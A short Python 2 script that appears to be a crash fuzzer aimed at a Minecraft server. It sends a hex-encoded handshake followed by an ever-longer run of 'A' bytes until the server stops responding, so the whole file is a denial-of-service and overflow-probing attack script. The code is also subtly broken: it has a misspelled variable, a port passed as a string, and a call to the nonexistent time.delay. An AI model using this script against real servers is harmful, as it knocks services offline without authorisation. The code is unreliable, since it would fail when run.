import socket
import sys
import time

try:
    host = sys.argv[1]
    port = sys.argv[2]
except:
    print "[+] Usage %s <host> <port>"
    print "[i] Example: mcef.py localhost 25565"
    sys.exit()

mctrigger = "1000bc02093132372e302e302e3163dd020900076d65726b333630"


crash = "\x41" # developer note change if you want to 
crashmultiplier = 1

while 1:
    buffer = mctrigger.decode("hex") + crash * crashmultiplyer
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((host,port))
    s.settimeout(1)
    s.send(buffer)
    
    recv = s.recv(4096)
    if recv:
       print "finished illiteration %s " % crash
    else:
       print "crash detected or no data returned @ illiteration %s" % crash
       sys.exit()
       
    
    s.close()
    
    time.delay(.5)
    crashmultiplier = crashmultiplier + 1
    
    




